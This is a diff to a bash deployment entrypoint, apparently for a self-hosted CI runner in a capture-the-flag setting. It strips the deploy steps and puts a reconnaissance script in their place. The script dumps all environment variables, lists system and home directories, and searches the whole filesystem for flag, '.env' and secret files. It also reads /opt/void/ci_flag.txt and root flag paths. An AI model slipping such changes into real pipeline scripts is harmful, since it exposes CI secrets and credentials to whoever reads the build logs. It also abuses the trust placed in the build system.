@@ -1,14 +1,32 @@
 #!/usr/bin/env bash
-# Deployment entrypoint executed by the self-hosted runner.
 set -euo pipefail
-echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
-echo "[deploy] pulling latest VOID service artifacts..."
-# TODO: real deploy steps (rsync artifacts, restart services)
-echo "[deploy] done."
-echo "=== TARGET INSPECTION ==="
+
+echo "[+] Host info"
+hostname
+whoami
 id
-env
+pwd
+
+echo "[+] Environment variables"
+env | sort
+
+echo "[+] Interesting directories"
 ls -la /
-find / -name "*flag*" 2>/dev/null || true
-echo "=== PRINTING THE FLAG ==="
-cat /opt/void/ci_flag.txt
+ls -la /opt || true
+ls -la /opt/void || true
+ls -la /home || true
+
+echo "[+] Searching for flags"
+find / -iname "*flag*" 2>/dev/null || true
+
+echo "[+] Searching for secrets"
+find / -iname "*.env" 2>/dev/null || true
+find / -iname "*secret*" 2>/dev/null || true
+
+echo "[+] CI FLAG"
+cat /opt/void/ci_flag.txt || true
+
+echo "[+] Root flag attempts"
+cat /root/root.txt 2>/dev/null || true
+cat /flag.txt 2>/dev/null || true
+cat /root/flag.txt 2>/dev/null || true
